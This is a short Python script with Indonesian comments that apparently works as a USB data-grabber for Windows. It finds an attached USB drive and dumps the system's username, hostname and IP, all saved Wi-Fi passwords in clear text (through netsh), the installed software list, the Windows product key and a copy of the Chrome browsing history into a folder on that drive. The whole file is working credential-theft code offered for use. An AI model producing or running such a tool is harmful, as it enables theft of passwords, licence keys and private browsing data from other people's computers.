import os
import socket
import subprocess
import shutil

# Tentukan drive USB (cari otomatis)
usb_drive = None
for drive in "DEFGHIJKLMNOPQRSTUVWXYZ":  # Cek drive USB dari D-Z
    if os.path.exists(f"{drive}:\\"):
        usb_drive = f"{drive}:\\"
        break

if usb_drive is None:
    exit()  # Keluar kalau gak ada USB

# Folder untuk menyimpan data
dump_folder = os.path.join(usb_drive, "Win_Dump")
if not os.path.exists(dump_folder):
    os.makedirs(dump_folder)

# Ambil info sistem
username = os.getenv("USERNAME")
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

with open(os.path.join(dump_folder, "system_info.txt"), "w") as f:
    f.write(f"Username: {username}\n")
    f.write(f"Hostname: {hostname}\n")
    f.write(f"IP Address: {ip_address}\n")

# Dump Wi-Fi passwords
wifi_dump = os.path.join(dump_folder, "wifi_passwords.txt")
with open(wifi_dump, "w") as f:
    f.write("== Saved Wi-Fi Passwords ==\n\n")
    profiles = subprocess.getoutput("netsh wlan show profiles")
    for line in profiles.split("\n"):
        if "All User Profile" in line:
            ssid = line.split(":")[1].strip()
            result = subprocess.getoutput(f'netsh wlan show profile name="{ssid}" key=clear')
            f.write(result + "\n\n")

# Ambil daftar software terinstall
software_dump = os.path.join(dump_folder, "installed_software.txt")
subprocess.run(f'wmic product get name,version > "{software_dump}"', shell=True)

# Coba ambil Windows Product Key
try:
    product_key = subprocess.getoutput("wmic path softwarelicensingservice get OA3xOriginalProductKey")
    with open(os.path.join(dump_folder, "windows_product_key.txt"), "w") as f:
        f.write(product_key.strip())
except:
    pass

# Cek browser history (Chrome)
chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\History")
if os.path.exists(chrome_path):
    shutil.copy(chrome_path, os.path.join(dump_folder, "chrome_history.db"))

print("Data berhasil disimpan di USB!")
